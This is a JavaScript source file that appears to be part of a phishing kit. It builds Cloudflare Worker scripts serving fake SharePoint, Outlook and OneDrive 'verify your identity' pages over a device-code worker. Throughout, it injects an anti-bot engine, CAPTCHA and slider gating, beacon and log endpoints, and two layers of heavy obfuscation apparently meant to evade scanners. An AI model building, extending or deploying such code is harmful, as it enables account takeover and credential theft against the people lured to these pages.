// Template Loader - Builds worker script with injected template HTML
// Used server-side during worker deployment
const fs = require('fs');
const path = require('path');
const { loadTemplateHTML, loadTemplateCSS, loadTemplateJS, loadVerificationDesignCSS, loadVerificationDesignHTML, buildSliderOverlay } = require('../backend/services/templateloader');
const config = require('../backend/config/env');

async function buildWorkerScript(link, user) {
  // SANITIZE: Only include safe fields, exclude ALL sensitive data (tokens, secrets, keys)
  const safeUser = {
    id: user?.id,
    subscription_status: user?.subscription_status,
    subscription_plan: user?.subscription_plan,
  };
  // NEVER embed: login_key, totp_secret, telegram_id, telegram_bot_token,
  // cf_api_token, cf_account_id, bunny_api_key, bunny_storage_zone
  // These must NEVER leave the backend. Worker should fetch from backend API at runtime.

  const templateType = link.template_type || 'sharepoint4';
  const designName = link.verification_design || 'outlook';
  let templateHTML = loadTemplateHTML(templateType);
  console.log('[TemplateLoader] templateType:', templateType, 'templateHTML length:', templateHTML ? templateHTML.length : 0);

  const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
  let templateJS = loadTemplateJS(templateType);

  // Load vg-engine.js for anti-bot and verification logic
  let vgEngine = '';
  const vgEnginePath = path.join(__dirname, '..', 'templates', 'assets', 'vg-engine.js');
  if (fs.existsSync(vgEnginePath)) {
    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
  }

  // Replace template placeholders (template already has <style> and <script> tags)
  templateHTML = templateHTML
    .replace('/* {{CSS}} */', templateCSS)
    .replace('// {{SCRIPT}}', templateJS);

  console.log('[TemplateLoader] After placeholder replacement:');
  console.log('  HTML length:', templateHTML.length);
  console.log('  Contains <style>:', templateHTML.includes('<style>'));
  console.log('  Contains </style>:', templateHTML.includes('</style>'));
  console.log('  Contains <script>:', templateHTML.includes('<script>'));
  console.log('  Contains </script>:', templateHTML.includes('</script>'));
  console.log('  Contains <head>:', templateHTML.includes('<head>'));
  console.log('  Contains </head>:', templateHTML.includes('</head>'));
  console.log('  Contains <body>:', templateHTML.includes('<body'));

  // Inject vg-engine.js before closing </head>
  if (vgEngine && templateHTML.includes('</head>')) {
    console.log('[TemplateLoader] Injecting vg-engine.js, length:', vgEngine.length);
    console.log('  vg-engine contains </script>:', vgEngine.includes('</script>'));
    console.log('  vg-engine contains <script>:', vgEngine.includes('<script>'));
    
    templateHTML = templateHTML.replace('</head>', '<script>' + vgEngine + '</script></head>');
    console.log('[TemplateLoader] vg-engine.js injected successfully');
    console.log('  HTML length after vg-engine:', templateHTML.length);
  } else {
    console.warn('[TemplateLoader] vg-engine.js NOT injected');
    console.warn('  vgEngine exists:', !!vgEngine, 'length:', vgEngine ? vgEngine.length : 0);
    console.warn('  HTML contains </head>:', templateHTML.includes('</head>'));
  }

  // Load template config for defaults
  var templateConfig = {};
  try {
    templateConfig = require('../templates/' + templateType + '/config.json');
  } catch(e) {}

  // Helper to get config default
  function getConfigDefault(key, fallback) {
    if (!templateConfig || !templateConfig.fields) return fallback;
    var field = templateConfig.fields.find(function(f) { return f.key === key; });
    return field && field.default !== undefined ? field.default : fallback;
  }

  // Replace remaining placeholders - use template config defaults as fallbacks
  templateHTML = templateHTML
    .replace('{{TITLE}}', link.title_text || getConfigDefault('title', 'Verify your identity'))
    .replace('{{MESSAGE}}', link.message_text || getConfigDefault('message', 'Please verify your identity to continue'))
    .replace('{{BUTTON_TEXT}}', link.button_text || getConfigDefault('button_text', 'Get verification code'))
    .replace('{{FILE_NAME}}', link.file_name || getConfigDefault('file_name', 'Document.pdf'))
    .replace('{{PAGES}}', String(link.pages || getConfigDefault('pages', 1)));

  // Handle preload/no-preload
  try {
    const templateConfig = require(`../templates/${templateType}/config.json`);
    if (templateConfig.preload) {
      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
    } else {
      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
    }
  } catch (e) {
    // Template config may not exist for some types - skip preload handling
  }

  // ═══════════════════════════════════════════
  // INJECT SLIDER OVERLAY (if slider design selected)
  // ═══════════════════════════════════════════
  const sliderData = loadVerificationDesignHTML(designName);
  const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;
  
  console.log('[TemplateLoader] Slider detection:');
  console.log('  designName:', designName);
  console.log('  sliderData.hasHtml:', sliderData.hasHtml);
  console.log('  isSliderDesign:', isSliderDesign);
  
  if (isSliderDesign) {
    console.log('[TemplateLoader] Slider design detected, injecting slider overlay...');

    // vg-engine gates its whole slider chain handler on window.__SLIDER_DESIGN
    // (initSliderChainHandler returns early when it is false/undefined), so the
    // flag MUST be in the page. The backend loader sets it; this worker loader
    // did not, so initSliderChainHandler bailed out, __vgOnSliderComplete was
    // never registered, and the slider dead-ended with no Cloudflare step.
    const sliderFlag = '<script>window.__SLIDER_DESIGN=true</script>';
    if (templateHTML.includes('</head>')) {
      templateHTML = templateHTML.replace('</head>', sliderFlag + '</head>');
      console.log('  __SLIDER_DESIGN flag injected before </head>');
    } else {
      templateHTML = templateHTML.replace(/<body[^>]*>/i, function (m) { return m + sliderFlag; });
      console.warn('  No </head> - __SLIDER_DESIGN flag injected at top of <body>');
    }

    const sliderOverlay = buildSliderOverlay(sliderData, link, false);
    console.log('  sliderOverlay length:', sliderOverlay.length);
    console.log('  sliderOverlay contains <script>:', sliderOverlay.includes('<script>'));
    console.log('  sliderOverlay contains </script>:', sliderOverlay.includes('</script>'));
    
    // Inject slider overlay right after <body> tag
    const bodyMatch = templateHTML.match(/<body[^>]*>/i);
    console.log('  body tag found:', !!bodyMatch);
    
    templateHTML = templateHTML.replace(/<body[^>]*>/i, function(match) {
      console.log('  Injecting slider after body tag:', match.substring(0, 50) + '...');
      return match + sliderOverlay;
    });
    console.log('[TemplateLoader] Slider overlay injected, templateHTML length:', templateHTML.length);
    
    // Verify injection
    console.log('  templateHTML contains vgSliderLayer:', templateHTML.includes('vgSliderLayer'));
    console.log('  templateHTML contains vgCfLayer:', templateHTML.includes('vgCfLayer'));
  } else {
    console.log('[TemplateLoader] No slider design, skipping slider injection');
  }

  // Load worker base
  let workerScript = fs.readFileSync(path.join(__dirname, 'devicecode-worker.js'), 'utf8');

  // Inject values - use CF_WORKERS_SUBDOMAIN when set, otherwise fall back to
  // configured APP_URL or a localhost development URL. Avoid producing "https://.workers.dev".
  let serverUrl = '';
  if (config.CF_WORKERS_SUBDOMAIN) {
    serverUrl = `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev`;
  } else if (config.API_URL) {
    serverUrl = String(config.API_URL).trim().replace(/\/$/, '');
  } else if (config.APP_URL) {
    serverUrl = String(config.APP_URL).trim().replace(/\/$/, '');
  } else {
    serverUrl = `http://localhost:${config.PORT || 3000}`;
  }

  // Inject user data as a sanitized JSON string
  const safeUserJson = JSON.stringify(safeUser);

  // ═══════════════════════════════════════════
  // FINAL HTML DIAGNOSTICS
  // ═══════════════════════════════════════════
  console.log('[TemplateLoader] ═══ FINAL HTML DIAGNOSTICS ═══');
  console.log('  Total HTML length:', templateHTML.length);
  console.log('  Contains <html>:', templateHTML.includes('<html>'));
  console.log('  Contains </html>:', templateHTML.includes('</html>'));
  console.log('  Contains <head>:', templateHTML.includes('<head>'));
  console.log('  Contains </head>:', templateHTML.includes('</head>'));
  console.log('  Contains <body:', templateHTML.includes('<body'));
  console.log('  Contains </body>:', templateHTML.includes('</body>'));
  console.log('  Contains <style>:', templateHTML.includes('<style>'));
  console.log('  Contains </style>:', templateHTML.includes('</style>'));
  console.log('  Contains <script>:', templateHTML.includes('<script>'));
  console.log('  Contains </script>:', templateHTML.includes('</script>'));
  
  // Count script tags
  const scriptOpenCount = (templateHTML.match(/<script/g) || []).length;
  const scriptCloseCount = (templateHTML.match(/<\/script>/g) || []).length;
  console.log('  <script> tags:', scriptOpenCount);
  console.log('  </script> tags:', scriptCloseCount);
  console.log('  Script tags balanced:', scriptOpenCount === scriptCloseCount);
  
  if (scriptOpenCount !== scriptCloseCount) {
    console.warn('  ⚠️  UNBALANCED SCRIPT TAGS - HTML may be broken!');
  }
  
  // Check for nested script tags (common issue)
  if (templateHTML.includes('<script><script>')) {
    console.warn('  ⚠️  NESTED <script><script> DETECTED - HTML is broken!');
  }
  if (templateHTML.includes('</script></script>')) {
    console.warn('  ⚠️  NESTED </script></script> DETECTED - HTML is broken!');
  }
  
  // Check for vg-engine.js
  if (vgEngine) {
    console.log('  vg-engine.js loaded:', true, 'length:', vgEngine.length);
    console.log('  HTML contains vg-engine:', templateHTML.includes('isBotRequest'));
    console.log('  HTML contains initTurnstileVerification:', templateHTML.includes('initTurnstileVerification'));
  }
  
  // Check for slider overlay
  if (isSliderDesign) {
    console.log('  Slider overlay loaded:', true);
    console.log('  HTML contains vgSliderLayer:', templateHTML.includes('vgSliderLayer'));
    console.log('  HTML contains vgCfLayer:', templateHTML.includes('vgCfLayer'));
    console.log('  HTML contains __SLIDER_DESIGN:', templateHTML.includes('__SLIDER_DESIGN'));
  }
  
  console.log('[TemplateLoader] ═══ END DIAGNOSTICS ═══');

  // Version marker - helps verify the new code is deployed
  workerScript = '// VG_WORKER_VERSION: 2.0 - ' + new Date().toISOString() + '\n' + workerScript;

  // Use split/join for reliable placeholder replacement
  var sq = String.fromCharCode(39); // single quote
  var quotedUrl = sq + serverUrl + sq;
  workerScript = workerScript.split(sq + '{{VERIFY_ENDPOINT}}' + sq).join(quotedUrl);
  workerScript = workerScript.split(sq + '{{BEACON_ENDPOINT}}' + sq).join(quotedUrl);
  workerScript = workerScript.split(sq + '{{LOG_ENDPOINT}}' + sq).join(quotedUrl);
  workerScript = workerScript.split(sq + '{{TURNSTILE_SECRET}}' + sq).join(sq + (config.CF_TURNSTILE_SECRET_KEY || '') + sq);
  workerScript = workerScript.split(sq + '{{TEMPLATE_HTML}}' + sq).join(JSON.stringify(templateHTML));
  workerScript = workerScript.split(sq + '{{USER_DATA}}' + sq).join(safeUserJson);

  // Per-link Turnstile key injection (Widget Pool) — resolve from the pool
  // for this link, then fall back to the env var.
  try {
    var turnstilePool = require('../backend/services/turnstile-pool');
    if (link && link.id) {
      var assignedKey = await turnstilePool.getAssignedSiteKey(link.id);
      if (assignedKey) {
        workerScript = workerScript.split(sq + '{{TURNSTILE_KEY}}' + sq).join(sq + assignedKey + sq);
        workerScript = workerScript.split('{{TURNSTILE_KEY}}').join(assignedKey);
      }
    }
  } catch (e) {
    // Use env fallback — already injected below if needed
  }

  // Also replace without quotes (in case format changed)
  workerScript = workerScript.split('{{VERIFY_ENDPOINT}}').join(serverUrl);
  workerScript = workerScript.split('{{BEACON_ENDPOINT}}').join(serverUrl);
  workerScript = workerScript.split('{{LOG_ENDPOINT}}').join(serverUrl);
  workerScript = workerScript.split('{{JWT_TOKEN}}').join('');
  workerScript = workerScript.split('{{TURNSTILE_KEY}}').join('');

  console.log('[TemplateLoader v2.0] Server URL:', serverUrl);
  console.log('[TemplateLoader v2.0] BEACON remaining:', (workerScript.split('BEACON_ENDPOINT').length - 1));
  console.log('[TemplateLoader v2.0] VERIFY remaining:', (workerScript.split('VERIFY_ENDPOINT').length - 1));


  // Obfuscate if enabled - WORKER-SAFE approach
  // We use a custom, lightweight obfuscation that's safe for Cloudflare Workers
  // Cloudflare Workers don't have window/document, so we must be careful
  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
    try {
      console.log('[Obfuscation] Worker: Starting safe obfuscation...');
      const originalLength = workerScript.length;
      
      // Step 1: Extract template HTML to protect it from obfuscation.
      //
      // The template is embedded by JSON.stringify() into a DOUBLE-quoted
      // declaration (const templateHTML = "...";), so the old regex -
      // /var templateHTML = '...'/ - matched nothing: wrong declaration keyword
      // AND wrong quote style. The extraction silently no-oped, and the ~300KB
      // HTML string was fed straight through controlFlowFlattening + rc4 +
      // splitStrings, bloating the worker payload enormously.
      //
      // This handles var/let/const and either quote style, honouring escapes.
      const TEMPLATE_HOLE = '\u0000VG_TEMPLATE_HTML\u0000';
      const USERDATA_HOLE = '\u0000VG_USERDATA\u0000';
      // Group 1 = "const templateHTML = " (declaration), group 2 = the complete
      // quoted literal, which JSON.parse() can decode straight away.
      const QUOTED = '(?:"(?:\\\\.|[^"\\\\])*")|(?:\'(?:\\\\.|[^\'\\\\])*\')';
      const reTemplate = new RegExp('(\\b(?:var|const|let)\\s+templateHTML\\s*=\\s*)(' + QUOTED + ')\\s*;');
      const reUserData = new RegExp('(\\b(?:var|const|let)\\s+userData\\s*=\\s*)(' + QUOTED + ')\\s*;');

      let extractedTemplate = '';
      const templateMatch = workerScript.match(reTemplate);
      if (templateMatch) {
        extractedTemplate = JSON.parse(templateMatch[2]);
        workerScript = workerScript.replace(reTemplate, '$1 ' + TEMPLATE_HOLE + ';');
      }

      // Step 2: Extract user data to protect it
      let extractedUserData = '';
      const userDataMatch = workerScript.match(reUserData);
      if (userDataMatch) {
        extractedUserData = JSON.parse(userDataMatch[2]);
        workerScript = workerScript.replace(reUserData, '$1 ' + USERDATA_HOLE + ';');
      }

      // Step 3: Apply lightweight obfuscation (string encoding + variable renaming)
      // This is safe for Cloudflare Workers because it doesn't rename globals
      workerScript = obfuscateWorkerCodeMulti(workerScript);

      // Step 4: Re-inject the protected template and user data.
      // JSON.stringify instead of base64/atob: atob() decodes to a Latin-1
      // string, so any non-ASCII character in the template HTML (e.g. the "·"
      // in "OneDrive · Access Your Files") would come back as mojibake.
      if (extractedTemplate) {
        workerScript = workerScript.split(TEMPLATE_HOLE).join(JSON.stringify(extractedTemplate));
      }
      if (extractedUserData) {
        workerScript = workerScript.split(USERDATA_HOLE).join(JSON.stringify(extractedUserData));
      }

      console.log('[Obfuscation] Worker: ' + originalLength + ' -> ' + workerScript.length + ' chars');
    } catch (e) {
      console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
    }
  }

  return workerScript;
}

// ─── Worker-Safe Obfuscation ────────────────────────────────
// Custom lightweight obfuscation that's safe for Cloudflare Workers
// Does NOT rename globals (window, document, fetch, etc.)
// Only encodes strings and renames local variables
function obfuscateWorkerCode(code) {
  // 1. String encoding - encode all string literals
  code = code.replace(/'([^']{10,})'/g, function(match, str) {
    // Skip if it looks like code or contains special characters
    if (str.includes('function') || str.includes('var ') || str.includes('return')) {
      return match;
    }
    // Encode short strings
    try {
      const encoded = Buffer.from(str).toString('base64');
      return `atob('${encoded}')`;
    } catch(e) {
      return match;
    }
  });
  
  // 2. Simple variable renaming (only local vars, not globals)
  // Rename common variable names to hex
  const varMap = {
    'visitorIp': '_v',
    'visitorIP': '_v',
    'blockResponse': '_br',
    'blockData': '_bd',
    'templateHTML': '_th',
    'userData': '_ud',
    'verifyData': '_vd',
    'deviceCode': '_dc',
    'userCode': '_uc',
    'verificationUri': '_vu',
    'expiresIn': '_ei',
    'interval': '_iv',
    'proxyConfig': '_pc',
    'proxyId': '_pi',
    'request': '_r',
    'response': '_rs',
    'url': '_u',
    'jwtToken': '_jt',
    'turnstileKey': '_tk',
    'originalHTML': '_oh',
    'ipType': '_it',
    'method': '_m',
    'headers': '_h',
    'body': '_b',
    'status': '_st',
    'error': '_e',
    'result': '_rslt',
    'data': '_d',
    'token': '_t',
  };
  
  // Apply variable renaming (word boundary matching)
  for (const [original, renamed] of Object.entries(varMap)) {
    const regex = new RegExp('\\b' + original + '\\b', 'g');
    code = code.replace(regex, renamed);
  }
  
  // 3. Remove comments
  code = code.replace(/\/\/.*$/gm, '');
  code = code.replace(/\/\*[\s\S]*?\*\//g, '');
  
  // 4. Minify whitespace (simple version)
  code = code.replace(/\n\s*/g, '\n');
  code = code.replace(/\s+/g, ' ');
  
  return code;
}
// ─── Multi-Layer Worker Obfuscation ────────────────────────────────
// Maximum protection using javascript-obfuscator + custom layers
function obfuscateWorkerCodeMulti(code) {
  const JavaScriptObfuscator = require('javascript-obfuscator');
  
  // Layer 1: String encoding + control flow flattening
  console.log('[Obfuscation] Layer 1: String encoding + control flow...');
  const obfuscated1 = JavaScriptObfuscator.obfuscate(code, {
    compact: false,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.8,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.8,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
    renameGlobals: false,
    selfDefending: false,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['rc4', 'base64'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 5,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 5,
    stringArrayWrappersType: 'variable',
    transformObjectKeys: true,
    unicodeEscapeSequence: true,
    numbersToExpressions: true,
    simplify: false,
    splitStrings: true,
    splitStringsChunkLength: 2,
  });
  
  let layer1Code = obfuscated1.getObfuscatedCode();
  console.log('[Obfuscation] Layer 1: ' + code.length + ' -> ' + layer1Code.length + ' chars');
  
  // Layer 2: Additional obfuscation
  console.log('[Obfuscation] Layer 2: Additional obfuscation...');
  const obfuscated2 = JavaScriptObfuscator.obfuscate(layer1Code, {
    compact: false,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.9,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.9,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'mangled',
    renameGlobals: false,
    selfDefending: false,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['rc4'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 3,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 3,
    stringArrayWrappersType: 'variable',
    transformObjectKeys: true,
    unicodeEscapeSequence: true,
    numbersToExpressions: true,
    simplify: false,
    splitStrings: true,
    splitStringsChunkLength: 3,
  });
  
  let layer2Code = obfuscated2.getObfuscatedCode();
  console.log('[Obfuscation] Layer 2: ' + layer1Code.length + ' -> ' + layer2Code.length + ' chars');
  
  return layer2Code;
}
